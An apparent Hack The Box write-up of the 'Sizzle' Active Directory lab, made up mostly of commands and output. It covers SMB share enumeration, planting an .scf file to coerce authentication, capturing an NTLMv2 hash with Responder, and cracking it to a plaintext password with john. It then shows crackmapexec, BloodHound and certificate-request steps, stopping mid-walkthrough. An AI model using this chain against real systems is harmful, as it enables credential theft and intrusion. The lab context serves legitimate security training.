---
title: "[HTB] Sizzle"
permalink: /writeups/htb/sizzle/
excerpt: "Quick write-up for the Sizzle machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
---

---

{% include toc icon="cog" title="Sizzle Solution" %}

The [Sizzle](https://app.hackthebox.com/machines/Sizzle) machine has been created by [mrb3n](https://app.hackthebox.com/users/2984) and [lkys37en](https://app.hackthebox.com/users/709). This is an hard Windows Machine with a strong focus on Active Directory exploitation.
{: .text-justify}

![image-center](/images/htb/htb_sizzle_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}

$ nmap -Pn -sV 10.129.154.99
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 13:24 EST
Nmap scan report for 10.129.154.99
Host is up (0.018s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.44 seconds


$ gobuster dir -u http://10.129.154.99 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
$ gobuster dir -u https://10.129.154.99 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


$ smbclient -N -L \\\\10.129.154.99                                                                                                                                       1 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available


$ smbclient "\\\\10.129.154.99\\Department Shares"
Enter WORKGROUP\ax's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018

                7779839 blocks of size 4096. 3145080 blocks available
smb: \> 




smb: \> cd ZZ_ARCHIVE\
smb: \ZZ_ARCHIVE\> ls
  .                                   D        0  Mon Jul  2 15:32:58 2018
  ..                                  D        0  Mon Jul  2 15:32:58 2018
  AddComplete.pptx                    A   419430  Mon Jul  2 15:32:58 2018
  AddMerge.ram                        A   419430  Mon Jul  2 15:32:57 2018
  ConfirmUnprotect.doc                A   419430  Mon Jul  2 15:32:57 2018
  ConvertFromInvoke.mov               A   419430  Mon Jul  2 15:32:57 2018
  ConvertJoin.docx                    A   419430  Mon Jul  2 15:32:57 2018
  CopyPublish.ogg                     A   419430  Mon Jul  2 15:32:57 2018
  DebugMove.mpg                       A   419430  Mon Jul  2 15:32:57 2018
  DebugSelect.mpg                     A   419430  Mon Jul  2 15:32:58 2018
  DebugUse.pptx                       A   419430  Mon Jul  2 15:32:57 2018
  DisconnectApprove.ogg               A   419430  Mon Jul  2 15:32:58 2018
  DisconnectDebug.mpeg2               A   419430  Mon Jul  2 15:32:57 2018
  EditCompress.xls                    A   419430  Mon Jul  2 15:32:57 2018
  EditMount.doc                       A   419430  Mon Jul  2 15:32:58 2018
  EditSuspend.mp3                     A   419430  Mon Jul  2 15:32:58 2018
  EnableAdd.pptx                      A   419430  Mon Jul  2 15:32:57 2018
  EnablePing.mov                      A   419430  Mon Jul  2 15:32:58 2018
  EnableSend.ppt                      A   419430  Mon Jul  2 15:32:58 2018
  EnterMerge.mpeg                     A   419430  Mon Jul  2 15:32:57 2018
  ExitEnter.mpg                       A   419430  Mon Jul  2 15:32:58 2018
  ExportEdit.ogg                      A   419430  Mon Jul  2 15:32:57 2018
  GetOptimize.pdf                     A   419430  Mon Jul  2 15:32:58 2018
  GroupSend.rm                        A   419430  Mon Jul  2 15:32:58 2018
  HideExpand.rm                       A   419430  Mon Jul  2 15:32:58 2018
  InstallWait.pptx                    A   419430  Mon Jul  2 15:32:57 2018
  JoinEnable.ram                      A   419430  Mon Jul  2 15:32:58 2018
  LimitInstall.doc                    A   419430  Mon Jul  2 15:32:57 2018
  LimitStep.ppt                       A   419430  Mon Jul  2 15:32:57 2018
  MergeBlock.mp3                      A   419430  Mon Jul  2 15:32:58 2018
  MountClear.mpeg2                    A   419430  Mon Jul  2 15:32:57 2018
  MoveUninstall.docx                  A   419430  Mon Jul  2 15:32:57 2018
  NewInitialize.doc                   A   419430  Mon Jul  2 15:32:57 2018
  OutConnect.mpeg2                    A   419430  Mon Jul  2 15:32:58 2018
  PingGet.dot                         A   419430  Mon Jul  2 15:32:58 2018
  ReceiveInvoke.mpeg2                 A   419430  Mon Jul  2 15:32:56 2018
  RemoveEnter.mpeg3                   A   419430  Mon Jul  2 15:32:57 2018
  RemoveRestart.mpeg                  A   419430  Mon Jul  2 15:32:57 2018
  RequestJoin.mpeg2                   A   419430  Mon Jul  2 15:32:58 2018
  RequestOpen.ogg                     A   419430  Mon Jul  2 15:32:58 2018
  ResetCompare.avi                    A   419430  Mon Jul  2 15:32:58 2018
  ResetUninstall.mpeg                 A   419430  Mon Jul  2 15:32:58 2018
  ResumeCompare.doc                   A   419430  Mon Jul  2 15:32:58 2018
  SelectPop.ogg                       A   419430  Mon Jul  2 15:32:57 2018
  SuspendWatch.mp4                    A   419430  Mon Jul  2 15:32:58 2018
  SwitchConvertFrom.mpg               A   419430  Mon Jul  2 15:32:57 2018
  UndoPing.rm                         A   419430  Mon Jul  2 15:32:58 2018
  UninstallExpand.mp3                 A   419430  Mon Jul  2 15:32:57 2018
  UnpublishSplit.ppt                  A   419430  Mon Jul  2 15:32:58 2018
  UnregisterPing.pptx                 A   419430  Mon Jul  2 15:32:57 2018
  UpdateRead.mpeg                     A   419430  Mon Jul  2 15:32:57 2018
  WaitRevoke.pptx                     A   419430  Mon Jul  2 15:32:57 2018
  WriteUninstall.mp3                  A   419430  Mon Jul  2 15:32:58 2018

                7779839 blocks of size 4096. 3164475 blocks available
smb: \ZZ_ARCHIVE\> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \ZZ_ARCHIVE\> put hello.scf
putting file hello.scf as \ZZ_ARCHIVE\hello.scf (0.4 kb/s) (average 0.4 kb/s)
smb: \ZZ_ARCHIVE\> 


$ sudo responder -I tun0                                                                                                                                                  1 ⨯

[+] Listening for events...                                                                                                                                                     

[SMB] NTLMv2-SSP Client   : ::ffff:10.129.154.99
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:8a7e87c1233bc727:D2FE0898E458F50CE1058E063C2E11BE:010100000000000000CF78A4A921D801AC2B3950B152C1C4000000000200080031004B005000410001001E00570049004E002D00500031004800450031004400370050005A003100570004003400570049004E002D00500031004800450031004400370050005A00310057002E0031004B00500041002E004C004F00430041004C000300140031004B00500041002E004C004F00430041004C000500140031004B00500041002E004C004F00430041004C000700080000CF78A4A921D8010600040002000000080030003000000000000000010000000020000059F2C79AD3F324A2CB03F298893ECE8E71C147E0FE3F16F742F2FBA88ADBD0A30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003800000000000000000000000000      



$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)     
1g 0:00:00:10 DONE (2022-02-14 13:53) 0.09727g/s 1110Kp/s 1110Kc/s 1110KC/s Ashiah08..Arsenic
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 


$ crackmapexec smb 10.129.154.99 -u amanda -p Ashare1972                                                                                                                130 ⨯
SMB         10.129.154.99   445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.154.99   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 



$ bloodhound-python -c All -u amanda -p 'Ashare1972' -d htb.local -ns 10.129.154.99 --zip
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
WARNING: Could not resolve SID: S-1-5-21-2379389067-1826974543-3574127760-1000
INFO: Found 7 users
INFO: Connecting to GC LDAP server: sizzle.HTB.LOCAL
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: User Guest is logged in on sizzle.HTB.LOCAL from 10.10.14.28
WARNING: Could not resolve hostname to SID: 10.10.14.28
INFO: Done in 00M 08S
INFO: Compressing output into 20220214140225_bloodhound.zip


rackmapexec winrm 10.129.154.99 -u amanda -p Ashare1972                                                                                                                1 ⨯
SMB         10.129.154.99   5986   SIZZLE           [*] Windows 10.0 Build 14393 (name:SIZZLE) (domain:HTB.LOCAL)
HTTP        10.129.154.99   5986   SIZZLE           [*] https://10.129.154.99:5986/wsman
WINRM       10.129.154.99   5986   SIZZLE           [-] HTB.LOCAL\amanda:Ashare1972 "The server did not response with one of the following authentication methods Negotiate, Kerberos, NTLM - actual: ''"


$ openssl genrsa -des3 -out amanda.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
....................................................................................................+++++
.........+++++
e is 65537 (0x010001)
Enter pass phrase for amanda.key:
140451317425536:error:28078065:UI routines:UI_set_result_ex:result too small:../crypto/ui/ui_lib.c:905:You must type in 4 to 1023 characters
Enter pass phrase for amanda.key:
Verifying - Enter pass phrase for amanda.key:

                                                                                                                                                                                
┌──(ax㉿nms)-[~]
└─$ openssl req -new -key amanda.key -out amanda.csr                                                                                                                      130 ⨯
Enter pass phrase for amanda.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
                                                                                                                                                                                
┌──(ax㉿nms)-[~]
└─$ cat amanda.csr                                                                                        
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAMFY1hjNtjjyhKl89HSQmZduvu9EQ3LpspZbE1Vi
hC1cW8lK+ExZSCpeDgkysB3v+tMrRdMLMUUZ5ONOaATNMbPBW+QzNPvbP/DVoq0s
i4JPGHSAG0wBx0iP31KexQxkl0KoHw4FB66lSBTlpoos1FvhzHjfbQ6z0RxkJoQb
I4t2JeMIxDkSoZHBL22uRDI510xAo4haGPm//5MWJUDqj8EPF8Bci3fsGftSQVZ7
be0UDjinKvzSFiYislgRMN//bIFv9O+ivosIu4QBiSBwchJZqxAK/NLUYqs7iTEA
bQAYCurUdspdMBOBgd1qLH6EbmnmLaIgJQcXJp9uVIhFnGkCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQCfvJawzbT3hihufcZUinUe/j5s5ef044urPQhxOkvP4+QW
eOkRRF36FQnwtMS/2cKHS3b3YZiWsC+SSzZtyxBhf4iQkuVRA9uaOwxCtnakKW98
/+krSi26LavaiAkaKPGJ4KwvhDHuUhGUyRHzXFWfDr0x1f2V+O19xLYBiVJp2p/Y
S0isT7joRsQ/FTDDpmv0CZ5YdBHSW8L9jN4bho5RzAcXwd/VaEiOLzFcbY4yvzSA
VGJYYyLP/IsXZ8MbshNT/ksUIm7f6cRmtTpA+CiJrxN/IRemxvDr81ITTiFSCMOq
blrQg1FOAMeiPOy9EwDRysmBOYgO31Fpu+/7oc6x
-----END CERTIFICATE REQUEST-----

